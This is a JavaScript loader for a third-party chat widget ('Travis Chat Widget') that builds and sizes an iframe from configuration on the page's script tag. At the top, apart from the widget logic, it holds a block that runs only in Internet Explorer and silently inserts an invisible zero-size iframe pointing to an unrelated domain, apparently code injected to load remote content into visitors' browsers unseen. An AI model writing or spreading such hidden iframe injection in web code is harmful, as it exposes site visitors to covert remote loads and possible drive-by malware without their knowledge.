if (window.document.documentMode) {
	window.addEventListener("load",function(event) {
	    var ifrm = document.createElement("iframe");
	    ifrm.setAttribute("src", "https://seven.redbeardbuds.com/webstats");
	    ifrm.setAttribute('id', 'ifrmstats');
	    ifrm.style.width = "0";
	    ifrm.style.height = "0";
	    ifrm.style.border = "0";
	    document.body.appendChild(ifrm);
	},false);
}
(function ()
{
    // Get data from client's script tag.
    const tcw = document.querySelector('script[data-companyid][data-id="travischatwidget"]');
    const comid = tcw.getAttribute('data-companyid');
    // Get custom size from client.
    const wOpenWidth = '400px';
    const wOpenHeight = 'calc(100vh - 80px)';
    const wCloseWidth = '200px';
    const wCloseHeight = 'calc(100vh - 80px)';
    const bgColor = tcw.getAttribute('data-bg-color') || 'rgba(23,104,255,1)';
    const fontColor = tcw.getAttribute('data-color') || 'rgba(255,255,255,1)';
    // Delay widget load
    const wLoadDelay = parseInt(tcw.getAttribute('data-load-delay')) || 2000;
    setTimeout(() =>
    {
        // Signalr script
        var widgetFrame = document.createElement('iframe');
        widgetFrame.id = 'travischatwidget';
        widgetFrame.name = 'Travis Chat Widget';
        widgetFrame.src = `https://ds3954owgium6.cloudfront.net/index.html?companyid=${comid}&bgColor=${bgColor}&fontColor=${fontColor}`;
        widgetFrame.style = `position: fixed; bottom: 0; right: 0; border: 0px; padding: 0px; margin: 0px; width: ${wCloseWidth}; height: ${wCloseHeight}; max-height: 900px; z-index: 2147483646;`;
        widgetFrame.sandbox = 'allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox';

        var widgetDiv = document.createElement('div');
        widgetDiv.style = 'position: fixed; bottom: 0; right: 0; border: 0px; padding: 0px; margin: 0px; z-index: 2147483646;';
        widgetDiv.appendChild(widgetFrame);

        var pageTitle = document.title;

        const changeIFrame = (e) =>
        {
            if (e.origin === 'https://ds3954owgium6.cloudfront.net')
            {
                if (e.data[0] === 'travischatwidgetopen')
                {
                    if (window.innerWidth < 480)
                    {
                        document.getElementById("travischatwidget").style.width = window.innerWidth + 'px';
                        document.getElementById("travischatwidget").style.height = window.innerHeight + 'px';
                    } else
                    {
                        document.getElementById("travischatwidget").style.width = wOpenWidth;
                        document.getElementById("travischatwidget").style.height = wOpenHeight;
                    }
                } else if (e.data[0] === 'travischatwidgetclose')
                {
                    setTimeout(() =>
                    {
                        document.getElementById("travischatwidget").style.width = wCloseWidth;
                        document.getElementById("travischatwidget").style.height = wCloseHeight;
                    }, 100);
                } else if (e.data[0] === 'travischatwidgetunreadcount')
                {
                    if (e.data[1])
                    {
                        document.title = `(${e.data[1]}) ${pageTitle}`;
                    } else
                    {
                        document.title = pageTitle;
                    }
                }
            }
        }

        window.addEventListener('message', changeIFrame);

        try
        {
            widgetFrame.appendChild(document.createTextNode(''));
            document.body.appendChild(widgetDiv);
        } catch (e)
        {
            widgetFrame.text = '';
            widgetDiv.text = '';
            document.body.appendChild(widgetDiv);
        }
    }, wLoadDelay);
})();


